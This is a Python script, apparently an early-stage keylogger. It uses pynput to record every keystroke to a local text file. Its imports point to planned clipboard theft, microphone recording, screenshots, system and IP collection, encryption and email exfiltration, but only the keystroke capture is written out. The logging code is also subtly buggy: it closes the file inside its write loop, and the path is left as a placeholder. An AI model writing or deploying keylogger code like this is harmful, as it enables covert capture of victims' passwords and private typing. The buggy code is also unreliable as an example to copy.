#Libraries 

import smtplib 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import platform

#for Clipboards 
import win32clipboard

#for key logging 
from pynput.keyboard import Key,Listener

import time
import os

#for microphone and sound 
from scipy.io.wavfile import write
import sounddevice as sd 

#encrypt our file 
from cryptography.fernet import Fernet

#to get pass 
import getpass
from requests import get

#screenshot 
from multiprocessing import process, freeze_support
from PIL import ImageGrab

#keylogger
keys_information = "key_log.txt"

file_path= " "#put path here where you want to create the file with adding \\
extend = "\\"

count =0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count +=1

    if count>=1:
        count = 0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path +extend + keys_information, "a") as f: 
        for key in keys:
            k=str(key).replace("'","")
            if k.find('space')>0:
                f.write('\n')
                f.close()
            elif k.find("Key")==-1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()